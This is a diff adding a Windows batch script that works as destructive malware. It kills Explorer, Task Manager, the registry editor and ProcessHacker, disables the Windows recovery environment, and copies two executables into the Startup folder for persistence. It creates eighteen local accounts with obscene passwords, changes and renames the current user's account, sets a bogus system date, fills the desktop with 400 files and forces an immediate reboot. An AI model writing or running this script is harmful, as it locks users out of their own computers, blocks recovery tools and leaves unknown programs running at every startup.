@@ -1,0 +1,51 @@
+@echo off
+taskkill /f /im explorer.exe
+taskkill /f /im taskmgr.exe
+taskkill /f /im regedit.exe
+taskkill /f /im ProcessHacker.exe
+reagentc.exe /disable
+copy %temp%\MainT.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\MainT.exe"
+copy %temp%\OurFamily.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\OurFamily.exe"
+
+
+
+REM +++ create new account ++++++++++
+net user Now fUCKyOUxD /ADD
+net user You LICKMYASS /ADD
+net user Are PATATA01 /ADD
+net user In LOL01010 /ADD
+net user The PENIS000 /ADD
+net user Family YOUAREMINE11 /ADD
+net user :) youaregay1 /ADD
+net user N0w pussyenegri /ADD
+net user Y0u sniperonyouass /ADD
+net user Ar3 BITLOCK /ADD
+net user 1n byte0003 /ADD
+net user Th3 fUCKyOUxD /ADD
+net user F4m1ly LICKMYASS /ADD
+net user :( PATATA01 /ADD
+net user U LOL01010 /ADD
+net user R PENIS000 /ADD
+net user MINE YOUAREMINE11 /ADD
+net user :D youaregay1 /ADD
+
+REM +++++++++++++++++++++++++++++++++
+net user %username% urfckd
+wmic useraccount where name='%username%' set FullName='urfckd:)'
+wmic useraccount where name='%username%' rename 'urfckd:)'
+
+REM ++++++++++++++++++++++++++++++++++
+
+REM +++ Set Date and Time +++
+date 6-6-6666
+time 01:00:00 AM
+REM +++++++++++++++++++++++++
+SET /a cr=0
+
+
+:l
+copy %temp%\Again.txt "%userprofile%\Desktop\xD%cr%XT.txt"
+SET /a cr=%cr%+1
+if not %cr%==400 goto l
+
+shutdown /f /r /t 0
